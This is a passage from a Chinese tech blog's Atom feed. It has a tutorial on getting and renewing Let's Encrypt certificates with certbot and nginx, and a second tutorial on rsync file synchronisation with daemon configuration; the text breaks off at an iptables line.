<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>louis | blog</title>
  
  <subtitle>山不在高，有仙则名；水不在深，有龙则灵。</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://fenghong.tech/"/>
  <updated>2018-11-10T13:53:52.974Z</updated>
  <id>https://fenghong.tech/</id>
  
  <author>
    <name>Louis</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Let’s Encrypt使用</title>
    <link href="https://fenghong.tech/https-encrypt.html"/>
    <id>https://fenghong.tech/https-encrypt.html</id>
    <published>2018-11-08T15:59:32.000Z</published>
    <updated>2018-11-10T13:53:52.974Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="Let’s-Encrypt-及-Certbot-简介"><a href="#Let’s-Encrypt-及-Certbot-简介" class="headerlink" title="Let’s Encrypt 及 Certbot 简介"></a><strong>Let’s Encrypt 及 Certbot 简介</strong></h3><p>Let’s Encrypt 是 一个叫 <a href="https://linuxstory.org/tag/isrg/" target="_blank" rel="noopener">ISRG</a> （ Internet Security Research Group ，互联网安全研究小组）的组织推出的免费安全证书计划。参与这个计划的组织和公司可以说是互联网顶顶重要的先驱，除了前文提到的三个牛气哄哄的发起单位外，后来又有思科（全球网络设备制造商执牛耳者）、 Akamai 加入，甚至连 Linux 基金会也加入了合作，这些大牌组织的加入保证了这个项目的可信度和可持续性。</p><p><img src="https://linuxstory.org/wp-content/uploads/2016/11/lets-encrypt.png" alt="lets-encrypt"></p><p>尽管项目本身以及有该项目签发的证书很可信，但一开始 Let’s Encrypt 的安全证书配置起来比较麻烦，需要手动获取及部署。存在一定的门槛，没有一些技术底子可能比较难搞定。然后有一些网友就自己做了一些脚本来优化和简化部署过程。<br><strong>1. 获取 Certbot 客户端</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://dl.eff.org/certbot-auto</span><br><span class="line">chmod a+x ./certbot-auto</span><br><span class="line">./certbot-auto --help</span><br></pre></td></tr></table></figure><p><strong>2. 配置 nginx 、验证域名所有权</strong></p><p>在虚拟主机配置文件<code>/usr/local/nginx/conf/vhost/fenghong.tech.conf</code>中添加如下内容，这一步是为了通过 Let’s Encrypt 的验证，验证 fenghong.tech 这个域名是属于我的管理之下。（具体解释可见下一章“一些补充说明”的“ certbot 的两种工作方式”）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">location ^~ /.well-known/acme-challenge/ &#123;  </span><br><span class="line">default_type &quot;text/plain&quot;;   </span><br><span class="line">root     /www;</span><br><span class="line">&#125; </span><br><span class="line">location = /.well-known/acme-challenge/ &#123;   </span><br><span class="line">return 404;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>3. 重载 nginx</strong></p><p>配置好 <a href="https://fenghong.tech/tag/nginx/">Nginx</a> 配置文件，重载使修改生效（如果是其他系统 nginx 重载方法可能不同）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nginx -s reload</span><br></pre></td></tr></table></figure></p><p><strong>4. 生成证书</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./certbot-auto certonly --webroot -w /www -d  fenghong.tech</span><br></pre></td></tr></table></figure><p>中间会有一些自动运行及安装的软件，不用管，让其自动运行就好，有一步要求输入邮箱地址的提示，照着输入自己的邮箱即可，顺利完成的话，屏幕上会有提示信息。</p><p><strong>此处有坑！如果顺利执行请直接跳到第五步，我在自己的服务器上执行多次都提示</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">connection :: The server could not connect to the client for DV :: DNS query timed out</span><br></pre></td></tr></table></figure><p>发现问题出在 DNS 服务器上，我用的是 DNSpod ，无法通过验证，最后是将域名的 DNS 服务器临时换成 Godaddy 的才解决问题，通过验证，然后再换回原来的 DNSpod 。<br>证书生成成功后，会有 Congratulations 的提示，并告诉我们证书放在 /etc/letsencrypt/live 这个位置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">IMPORTANT NOTES:</span><br><span class="line"> - The following errors were reported by the server:</span><br><span class="line"></span><br><span class="line">   Domain: fenghong.tech</span><br><span class="line">   Type:   unauthorized</span><br><span class="line">   Detail: Invalid response from</span><br><span class="line">   http://fenghong.tech/.well-known/acme-challenge/kx-juv4XwQFz1TkhL1xGNda5Nm8_fwa8rQoRUfvS01c:</span><br><span class="line">   &quot;&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n  &lt;head&gt;\n    &lt;meta</span><br><span class="line">   http-equiv=\&quot;Content-type\&quot; content=\&quot;text/html; charset=utf-8\&quot;&gt;\n</span><br><span class="line">   &lt;meta http-equiv=\&quot;Co&quot;</span><br><span class="line"></span><br><span class="line">   Domain: www.fenghong.tech</span><br><span class="line">   Type:   unauthorized</span><br><span class="line">   Detail: Invalid response from</span><br><span class="line">   http://www.fenghong.tech/.well-known/acme-challenge/B0jELU0RmyeEt9xA9FKi6NTxj4m5PjJlvx4iCXNR4d8:</span><br><span class="line">   &quot;&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n  &lt;head&gt;\n    &lt;meta</span><br><span class="line">   http-equiv=\&quot;Content-type\&quot; content=\&quot;text/html; charset=utf-8\&quot;&gt;\n</span><br><span class="line">   &lt;meta http-equiv=\&quot;Co&quot;</span><br><span class="line"></span><br><span class="line">   To fix these errors, please make sure that your domain name was</span><br><span class="line">   entered correctly and the DNS A/AAAA record(s) for that domain</span><br><span class="line">   contain(s) the right IP address.</span><br></pre></td></tr></table></figure></p><p>  这个问题是因为自己的A记录是指向了github.io，导致配置文件根本读取不到，取消gitub的A记录即可，保持自己的A记录指向自己的IP哦！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IMPORTANT NOTES:</span><br><span class="line">- Congratulations! Your certificate and chain have been saved at   /etc/letsencrypt/live/fenghong.tech/fullchain.pem. Your cert   will expire on 2019-02-0. To obtain a new version of the   certificate in the future, simply run Let&apos;s Encrypt again.</span><br></pre></td></tr></table></figure><p><strong>5. 配置 Nginx</strong>（修改 <code>/usr/local/nginx/conf/vhost/fenghong.tech.conf</code>），使用 SSL 证书</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">listen 443 ssl;</span><br><span class="line">server_name fenghong.tech www.fenghong.tech;</span><br><span class="line">index index.html index.htm index.php;</span><br><span class="line">root  /www; </span><br><span class="line">ssl_certificate      /etc/letsencrypt/live/fenghong.tech/fullchain.pem;</span><br><span class="line">ssl_certificate_key  /etc/letsencrypt/live/fenghong.tech/privkey.pem;</span><br></pre></td></tr></table></figure><p>上面那一段是配置了 https 的访问，我们再添加一段 http 的自动访问跳转，将所有通过 <a href="http://www.fenghong.tech/" target="_blank" rel="noopener">http://www.fenghong.tech</a> 的访问请求自动重定向到 <a href="https://fenghong.tech/">https://fenghong.tech</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">server &#123;    </span><br><span class="line">listen 80;    </span><br><span class="line">server_name fenghong.tech www.fenghong.tech;    </span><br><span class="line">return 301 https://$server_name$request_uri;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>6. 重载 nginx，大功告成，此时打开网站就可以显示绿色小锁了</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nginx -s reload</span><br></pre></td></tr></table></figure><h3 id="♦后续工作"><a href="#♦后续工作" class="headerlink" title="♦后续工作"></a><strong>♦后续工作</strong></h3><p>出于安全策略， Let’s Encrypt 签发的证书有效期只有 90 天，所以需要每隔三个月就要更新一次安全证书，虽然有点麻烦，但是为了网络安全，这是值得的也是应该的。好在 Certbot 也提供了很方便的更新方法。</p><ol><li>测试一下更新，这一步没有在真的更新，只是在调用 Certbot 进行测试</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./certbot-auto renew --dry-run</span><br></pre></td></tr></table></figure><p>如果出现类似的结果，就说明测试成功了（总之有 Congratulations 的字眼）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Congratulations, all renewals succeeded. The following certs have been renewed:</span><br><span class="line">  /etc/letsencrypt/live/wiki.fenghong.tech/fullchain.pem (success)</span><br><span class="line">  /etc/letsencrypt/live/fenghong.tech/fullchain.pem (success)</span><br><span class="line">** DRY RUN: simulating &apos;certbot renew&apos; close to cert expiry</span><br><span class="line">**          (The test certificates above have not been saved.)</span><br></pre></td></tr></table></figure><ol start="2"><li>手动更新的方法</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./certbot-auto renew -v</span><br></pre></td></tr></table></figure><ol start="3"><li>自动更新的方法</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./certbot-auto renew --quiet --no-self-upgrade</span><br></pre></td></tr></table></figure><h3 id="♦一些补充说明解释"><a href="#♦一些补充说明解释" class="headerlink" title="♦一些补充说明解释"></a><strong>♦一些补充说明解释</strong></h3><p>1、certbot-auto 和 certbot</p><p>certbot-auto 和 certbot 本质上是完全一样的；不同之处在于运行 certbot-auto 会自动安装它自己所需要的一些依赖，并且自动更新客户端工具。因此在你使用 certbot-auto 情况下，只需运行在当前目录执行即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./certbot-auto</span><br></pre></td></tr></table></figure><p>2、certbot的两种工作方式</p><p>certbot （实际上是 certbot-auto ） 有两种方式生成证书：</p><ul><li><strong>standalone</strong> 方式： certbot 会自己运行一个 web server 来进行验证。如果我们自己的服务器上已经有 web server 正在运行 （比如 Nginx 或 Apache ），用 standalone 方式的话需要先关掉它，以免冲突。</li><li><strong>webroot</strong> 方式： certbot 会利用既有的 web server，在其 web root目录下创建隐藏文件， Let’s Encrypt 服务端会通过域名来访问这些隐藏文件，以确认你的确拥有对应域名的控制权。</li></ul><p>本文用的是 webroot 方式，也只推荐 webroot 方式，这也是前文第二步验证域名所有权在 nginx 虚拟主机配置文件中添加 location 段落内容的原因。</p><p>试了下<a href="https://github.com/xdtianyu/scripts/tree/master/lets-encrypt" target="_blank" rel="noopener">这个脚本</a>，在它的基础上改了一些，签发/更新比较方便（其实就是重新签发）。核心是使用<a href="https://github.com/diafygi/acme-tiny" target="_blank" rel="noopener">diafygi/acme-tiny</a>，相对于certbot复杂以及各种环境检查，安装一堆东西，这个Python写的工具我感觉好用多了，在傻瓜式和使用上选择了一个折中合适的点。</p><h3 id="一个快速获取-更新-Let’s-encrypt-证书的-shell-script"><a href="#一个快速获取-更新-Let’s-encrypt-证书的-shell-script" class="headerlink" title="一个快速获取/更新 Let’s encrypt 证书的 shell script"></a>一个快速获取/更新 Let’s encrypt 证书的 shell script</h3><hr><p>调用 acme_tiny.py 认证、获取、更新证书，不需要额外的依赖。</p><p><strong>下载到本地</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/oldthreefeng/scripts/master/lets-encrypt/letsencrypt.conf</span><br><span class="line">wget https://raw.githubusercontent.com/oldthreefeng/scripts/master/lets-encrypt/letsencrypt.sh</span><br><span class="line">chmod +x letsencrypt.sh</span><br></pre></td></tr></table></figure><p><strong>配置文件</strong></p><p>只需要修改 DOMAIN_KEY DOMAIN_DIR DOMAINS 为你自己的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ACCOUNT_KEY=&quot;letsencrypt-account.key&quot;</span><br><span class="line">DOMAIN_KEY=&quot;example.com.key&quot;</span><br><span class="line">DOMAIN_DIR=&quot;/var/www/example.com&quot;</span><br><span class="line">DOMAINS=&quot;DNS:example.com,DNS:whatever.example.com&quot;</span><br><span class="line">#ECC=TRUE</span><br><span class="line">#LIGHTTPD=TRUE</span><br></pre></td></tr></table></figure><p>执行过程中会自动生成需要的 key 文件。其中 <code>ACCOUNT_KEY</code> 为账户密钥， <code>DOMAIN_KEY</code> 为域名私钥， <code>DOMAIN_DIR</code> 为域名指向的目录，<code>DOMAINS</code> 为要签的域名列表， 需要 <code>ECC</code> 证书时取消 <code>#ECC=TRUE</code> 的注释，需要为 <code>lighttpd</code> 生成 <code>pem</code> 文件时，取消 <code>#LIGHTTPD=TRUE</code> 的注释。</p><p><strong>运行</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./letsencrypt.sh letsencrypt.conf</span><br></pre></td></tr></table></figure><p><strong>注意</strong></p><p>需要已经绑定域名到 <code>/var/www/example.com</code> 目录，即通过 <code>http://example.com</code> <code>http://whatever.example.com</code> 可以访问到 <code>/var/www/example.com</code> 目录，用于域名的验证</p><p><strong>将会生成如下几个文件</strong></p><pre><code>lets-encrypt-x1-cross-signed.pemexample.chained.crt          # 即网上搜索教程里常见的 fullchain.pemexample.com.key              # 即网上搜索教程里常见的 privkey.pem example.crtexample.csr</code></pre><p><strong>在 nginx 里添加 ssl 相关的配置</strong></p><pre><code>ssl_certificate     /path/to/cert/example.chained.crt;ssl_certificate_key /path/to/cert/example.com.key;</code></pre><p><strong>cron 定时任务</strong></p><p>每个月自动更新一次证书，可以在脚本最后加入 service nginx reload等重新加载服务。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 0 1 * * /etc/nginx/certs/letsencrypt.sh /etc/nginx/certs/letsencrypt.conf &gt;&gt; /var/log/lets-encrypt.log 2&gt;&amp;1  &amp;&amp; nginx -s reload</span><br></pre></td></tr></table></figure><p><strong>多个域名处理</strong></p><p>我有aaa.com和bbb.com，在同一个主机里进行https证书生成，这时，我们生成两个比如aaa.conf和bbb.conf.生成两个文件后，脚本运行两次即可。当然配置文件内容请看上面的信息，按需更改。<br>利用crontab 进行每月更新，具体如上，就不赘述了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./letsencrypt.sh aaa.conf</span><br><span class="line">./letsencrypt.sh bbb.conf</span><br></pre></td></tr></table></figure><h3 id="其它参考"><a href="#其它参考" class="headerlink" title="其它参考"></a>其它参考</h3><ul><li><a href="https://imququ.com/post/letsencrypt-certificate.html" target="_blank" rel="noopener">Let’s Encrypt，免费好用的 HTTPS 证书</a></li><li><a href="https://blog.kuoruan.com/71.html" target="_blank" rel="noopener">Let’s Encrypt免费HTTPS SSL证书获取教程</a></li><li><a href="https://www.paulyang.cn/blog/archives/39" target="_blank" rel="noopener">用Let’s Encrypt获取免费证书</a></li><li><p><a href="http://www.freehao123.com/lets-encrypt/" target="_blank" rel="noopener">免费SSL证书Let’s Encrypt安装使用教程:Apache和Nginx配置SSL</a></p></li><li><p><a href="https://www.digitalocean.com/community/tutorials/how-to-secure-nginx-with-let-s-encrypt-on-ubuntu-14-04" target="_blank" rel="noopener">How To Secure Nginx with Let’s Encrypt on Ubuntu 14.04</a></p></li><li><a href="https://www.v2ex.com/t/241819" target="_blank" rel="noopener">一个快速获取/更新 Let’s encrypt 证书的 shell script</a> | <a href="https://github.com/xdtianyu/scripts/blob/master/lets-encrypt/" target="_blank" rel="noopener">另外一个</a></li><li><a href="https://cipherli.st/" target="_blank" rel="noopener">Cipherli.st</a> 提供了各种webserver和一些软件的ssl推荐配置</li><li><a href="https://www.ssllabs.com/ssltest/index.html" target="_blank" rel="noopener">SSL Server Test</a> 站点https安全分析/检查</li><li><a href="https://www.freemindworld.com/blog/2016/160301_migrate_to_https_and_http2.shtml" target="_blank" rel="noopener">实践个人网站迁移HTTPS与HTTP/2</a></li><li><a href="https://wiki.tankywoo.com/tool/letsencrypt.html" target="_blank" rel="noopener">Wiki · Tanky Woo</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="server" scheme="https://fenghong.tech/categories/server/"/>
    
    
      <category term="Linux" scheme="https://fenghong.tech/tags/Linux/"/>
    
      <category term="Python" scheme="https://fenghong.tech/tags/Python/"/>
    
      <category term="nginx" scheme="https://fenghong.tech/tags/nginx/"/>
    
      <category term="certbot" scheme="https://fenghong.tech/tags/certbot/"/>
    
      <category term="https" scheme="https://fenghong.tech/tags/https/"/>
    
      <category term="acme_tiny" scheme="https://fenghong.tech/tags/acme-tiny/"/>
    
  </entry>
  
  <entry>
    <title>rsync和inotify实现文件同步</title>
    <link href="https://fenghong.tech/rsync.html"/>
    <id>https://fenghong.tech/rsync.html</id>
    <published>2018-11-07T01:59:32.000Z</published>
    <updated>2018-11-07T11:31:40.440Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="rsync"><a href="#rsync" class="headerlink" title="rsync"></a>rsync</h1><h2 id="什么是rsync"><a href="#什么是rsync" class="headerlink" title="什么是rsync"></a>什么是rsync</h2><p>rsync是一个远程数据同步工具，可通过LAN/WAN快速同步多台主机间的文件。它使用所谓的“Rsync演算法”来使本地和远程两个主机之间的文件达到同步，这个算法只传送两个文件的不同部分，而不是每次都整份传送，因此速度相当快。所以通常可以作为备份工具来使用。</p><p>运行Rsync server的机器也叫backup server，一个Rsync server可同时备份多个client的数据；也可以多个Rsync server备份一个client的数据。Rsync可以搭配ssh甚至使用daemon模式。Rsync server会打开一个873的服务通道(port)，等待对方rsync连接。连接时，Rsync server会检查口令是否相符，若通过口令查核，则可以开始进行文件传输。第一次连通完成时，会把整份文件传输一次，下一次就只传送二个文件之间不同的部份。</p><p><strong>基本特点：</strong></p><ol><li>可以镜像保存整个目录树和文件系统；</li><li>可以很容易做到保持原来文件的权限、时间、软硬链接等；</li><li>无须特殊权限即可安装；</li><li>优化的流程，文件传输效率高；</li><li>可以使用rcp、ssh等方式来传输文件，当然也可以通过直接的socket连接；</li><li>支持匿名传输。</li></ol><h2 id="rsync同步过程："><a href="#rsync同步过程：" class="headerlink" title="rsync同步过程："></a>rsync同步过程：</h2><p>rsync在同步文件的时候， 接收端会从发送端的数据中读取由文件索引号确认的文件. 然后打开<a href="http://blog.uouo123.com/tags-2217.html" target="_blank" rel="noopener">本地文件</a>(被称为基础文件), 建立一个临时文件. 接收端会读取非匹配数据和匹配数据, 并按顺序重组他们成为最终文件. 当非匹配数据被读取, 它会被写入到临时文件. 当收到一个块匹配记录, 接收端会寻找这个块在基础文件中的偏移量, 将这个块拷贝到临时文件. 通过这种方式, 临时文件被从头到尾建立起来. 建立临时文件的时候生成了文件的校验. 重建文件结束后, 这个校验和来自发送端的校验比较. 如果校验不符, 临时文件会被删除. 如果失败一次, 文件会再被处理一次. 如果失败第二次, 一个错误会被报告. 临时文件建立后, 所有者, 权限和修改时间会被设置. 然后它会被重命名已替代基础文件.</p><h2 id="Rsync工作原理"><a href="#Rsync工作原理" class="headerlink" title="Rsync工作原理"></a>Rsync工作原理</h2><p>1）软件简介</p><p>Rsync 是一个远程数据同步工具，可通过 LAN/WAN 快速同步多台主机间的文件。Rsync 本来是用以取代rcp 的一个工具，它当前由 Rsync.samba.org 维护。Rsync 使用所谓的“Rsync 演算法”来使本地和远程两个主机之间的文件达到同步，这个算法只传送两个文件的不同部分，而不是每次都整份传送，因此速度相当快。运行 Rsync server 的机器也叫 backup server，一个 Rsync server 可同时备份<a href="http://blog.uouo123.com/tags-1126.html" target="_blank" rel="noopener">多个</a> client 的数据；也可以多个Rsync server 备份一个 client 的数据。</p><p>Rsync 可以搭配 rsh 或 ssh 甚至使用 daemon 模式。Rsync server 会打开一个873的服务通道（port），等待对方 Rsync 连接。连接时，Rsync server 会检查口令是否相符，若通过口令查核，则可以开始进行文件传输。第一次连通完成时，会把整份文件传输一次，下一次就只传送二个文件之间不同的部份。</p><p>Rsync 支持大多数的类 Unix 系统，无论是 Linux、Solaris 还是 BSD 上都经过了良好的测试。此外，它在windows 平台下也有相应的版本，比较知名的有 cwRsync 和 Sync2NAS。</p><p>Rsync 的基本特点如下：</p><p>可以镜像保存整个目录树和<a href="http://blog.uouo123.com/tags-1181.html" target="_blank" rel="noopener">文件系统</a>；<br>可以很容易做到保持原来文件的权限、时间、软硬链接等；<br>无须<a href="http://blog.uouo123.com/tags-1207.html" target="_blank" rel="noopener">特殊权限</a>即可安装；<br>优化的<a href="http://blog.uouo123.com/tags-656.html" target="_blank" rel="noopener">流程</a>，文件传输效率高；<br>可以使用 rcp、ssh 等方式来传输文件，当然也可以通过直接的 socket 连接；<br>支持匿名传输。</p><p>2）核心算法</p><p>假定在名为 α 和 β 的两台计算机之间同步相似的文件 A 与 B，其中 α 对文件A拥有访问权，β 对文件 B 拥有访问权。并且假定主机 α 与 β 之间的网络带宽很小。那么 Rsync 算法将通过下面的五个步骤来完成：</p><p>β 将文件 B 分割成一组不重叠的固定大小为 S 字节的数据块。<a href="http://blog.uouo123.com/tags-1066.html" target="_blank" rel="noopener">最后一块</a>可能会比 S 小。<br>β 对每一个分割好的数据块执行两种校验：一种是32位的滚动弱校验，另一种是128位的 MD4 强校验。<br>β 将这些校验结果发给 α。<br>α 通过搜索文件 A 的所有大小为 S 的数据块（偏移量可以任选，不一定非要是 S 的倍数），来寻找与文件B 的某一块有着相同的弱校验码和强校验码的数据块。这项工作可以借助滚动校验的特性很快完成。<br>α 发给 β 一串指令来生成文件 A 在 β 上的备份。这里的每一条指令要么是对文件 B 经拥有某一个数据块而不须重传的证明，要么是一个数据块，这个数据块肯定是没有与文件 B 的任何一个数据块匹配上的。</p><p>3） 文件级别的RSync（只传输变化的文件）工作过程：（我的理解）</p><p>* 机器A构造FileList，FileList包含了需要与机器B sync的所有文件信息对name-&gt;id,（id用来唯一表示文件例如MD5）；<br>* 机器A将FileList发送到机器B；<br>* 机器B上运行的后台程序处理FileList，构建NewFileList，其中根据MD5的比较来删除机器B上已经存在的文件的信息对，只保留机器B上不存在或变化的文件;<br>* 机器A得到NewFileList，对NewFileList中的文件从新传输到机器B；</p><h2 id="安装："><a href="#安装：" class="headerlink" title="安装："></a>安装：</h2><p>rsync在CentOS6上默认已经安装，如果没有则可以使用<code>yum install rsync -y</code>，服务端和客户端是同一个安装包。</p><h2 id="同步到远程服务器"><a href="#同步到远程服务器" class="headerlink" title="同步到远程服务器"></a>同步到远程服务器</h2><p>在服务器间rsync传输文件，需要有一个是开着rsync的服务，而这一服务需要两个配置文件，说明当前运行的用户名和用户组，这个用户名和用户组在改变文件权限和相关内容的时候有用，否则有时候会出现提示权限问题。配置文件也说明了模块、模块化管理服务的安全性，每个模块的名称都是自己定义的，可以添加用户名密码验证，也可以验证IP，设置目录是否可写等，不同模块用于同步不同需求的目录。</p><h3 id="服务端配置文件"><a href="#服务端配置文件" class="headerlink" title="服务端配置文件"></a>服务端配置文件</h3><p><strong>/etc/rsyncd.conf：</strong> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#2014-12-11 by Sean</span><br><span class="line">uid = root</span><br><span class="line">gid = root</span><br><span class="line">use chroot = no</span><br><span class="line">pid file = /var/run/rsyncd.pid</span><br><span class="line">log file = /var/log/rsyncd.log</span><br><span class="line">port = 873</span><br><span class="line">read only = no</span><br><span class="line">[qianxiang]</span><br><span class="line">path = /data/qianxiang/web/</span><br><span class="line">ignore errors</span><br><span class="line">auth users = root</span><br><span class="line">secrets file = /etc/rsyncd.secrets</span><br><span class="line">hosts allow = 192.168.1.1</span><br><span class="line">hosts deny = *</span><br><span class="line"></span><br><span class="line">[file]</span><br><span class="line">path = /data/cun_web/</span><br><span class="line">ignore errors</span><br><span class="line">auth users = root</span><br><span class="line">secrets file = /etc/rsyncd.secrets</span><br><span class="line">hosts allow = 192.168.1.1</span><br><span class="line">hosts deny = *</span><br><span class="line"></span><br><span class="line">[nginx]</span><br><span class="line">path = /etc/nginx/</span><br><span class="line">ignore errors</span><br><span class="line">auth users = root</span><br><span class="line">secrets file = /etc/rsyncd.secrets</span><br><span class="line">hosts allow = 192.168.1.1</span><br><span class="line">hosts deny = *</span><br></pre></td></tr></table></figure><p>这里配置socket方式传输文件，端口873，[module_test]开始定义一个模块，指定要同步的目录（接收）path，授权用户，密码文件，允许哪台服务器IP同步（发送）等。</p><p>经测试，上述配置文件每行后面不能使用<code>#</code>来来注释</p><p><strong>/etc/rsyncd.secrets：</strong> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:passw0rd</span><br></pre></td></tr></table></figure><p>一行一个用户，用户名:密码。请注意这里的用户名和密码与操作系统的用户名密码无关，可以随意指定，与<code>/etc/rsyncd.conf</code>中的<code>auth users</code>对应。</p><p>修改权限：<code>chmod 600 /etc/rsyncd.d/rsync_server.pwd</code>。</p><h3 id="服务器启动rsync后台服务"><a href="#服务器启动rsync后台服务" class="headerlink" title="服务器启动rsync后台服务"></a>服务器启动rsync后台服务</h3><p>修改<code>/etc/xinetd.d/rsync</code>文件，disable 改为 no</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># default: off</span><br><span class="line"># description: The rsync server is a good addition to an ftp server, as it \</span><br><span class="line">#allows crc checksumming etc.</span><br><span class="line">service rsync</span><br><span class="line">&#123;</span><br><span class="line">disable= no</span><br><span class="line">flags= IPv6</span><br><span class="line">socket_type     = stream</span><br><span class="line">wait            = no</span><br><span class="line">user            = root</span><br><span class="line">server          = /usr/bin/rsync</span><br><span class="line">server_args     = --daemon</span><br><span class="line">log_on_failure  += USERID</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行<code>service xinetd restart</code>会一起重启rsync后台进程，默认使用配置文件<code>/etc/rsyncd.conf</code>。也可以使用<code>/usr/bin/rsync --daemon --config=/etc/rsyncd.conf</code>，重启建议<code>pkill rsync &amp;&amp; sleep 1 &amp;&amp; /usr/bin/rsync --daemon --config=/etc/rsyncd.conf</code> </p><p>为了以防rsync写入过多的无用日志到<code>/var/log/message</code>（容易塞满从而错过重要的信息），建议注释掉<code>/etc/xinetd.conf</code>的success：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># log_on_success  = PID HOST DURATION EXIT</span><br></pre></td></tr></table></figure><p>如果使用了防火墙，要添加允许IP到873端口的规则。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># iptables -A INPUT 